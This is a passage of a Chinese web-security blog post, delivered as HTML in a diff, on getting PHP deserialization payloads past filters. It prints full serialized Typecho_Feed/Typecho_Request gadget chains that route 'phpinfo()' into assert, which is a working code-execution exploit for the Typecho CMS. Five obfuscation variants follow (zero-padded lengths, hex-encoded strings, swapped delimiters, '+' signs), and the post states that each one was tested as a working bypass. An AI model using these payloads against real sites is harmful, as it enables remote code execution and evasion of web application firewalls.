class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;i:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;test_sangfor<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><h4 id="在表示长度的数字前添加一个或者多个0"><a href="#在表示长度的数字前添加一个或者多个0" class="headerlink" title="在表示长度的数字前添加一个或者多个0"></a>在表示长度的数字前添加一个或者多个0</h4></li>
+</ul>
+<p>可以在数字前如表示字符串长度的数字之前添加多个0，不影响反序列化结果：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">0000000007</span>:<span class="hljs-string">&quot;adapter&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;i:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><h4 id="字符串进行HEX编码"><a href="#字符串进行HEX编码" class="headerlink" title="字符串进行HEX编码"></a>字符串进行HEX编码</h4></li>
+</ul>
+<p>上文中提到了s标志与S的区别，即s是表示字符串ASCII字符，S表示字符串HEX编码的值，因此将s转换为hex可以达到一个比较良好的绕过效果：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;adapter&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;i:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;S:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;\70\68\70\69\6e\66\6f\28\29&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><h4 id="使用任意字符串代替s之后的分号："><a href="#使用任意字符串代替s之后的分号：" class="headerlink" title="使用任意字符串代替s之后的分号："></a>使用任意字符串代替s之后的分号：</h4></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;adapter&quot;</span>AO:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;i:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><h4 id="在数字之前添加一个"><a href="#在数字之前添加一个" class="headerlink" title="在数字之前添加一个+"></a>在数字之前添加一个+</h4></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:+<span class="hljs-number">7</span>:<span class="hljs-string">&quot;adapter&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;i:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><h4 id="使用任意字符替换O之后的"><a href="#使用任意字符替换O之后的" class="headerlink" title="使用任意字符替换O之后的:{"></a>使用任意字符替换O之后的:{</h4></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;adapter&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>AAs:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;i:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>以上绕过方式经测试均为有效绕过</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/02/%E4%B8%80%E4%B8%AAPHP%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">一个PHP代码注入漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/12/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/">
+                        <span class="hidden-mobile">身份认证逻辑缺陷漏洞挖掘思路</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
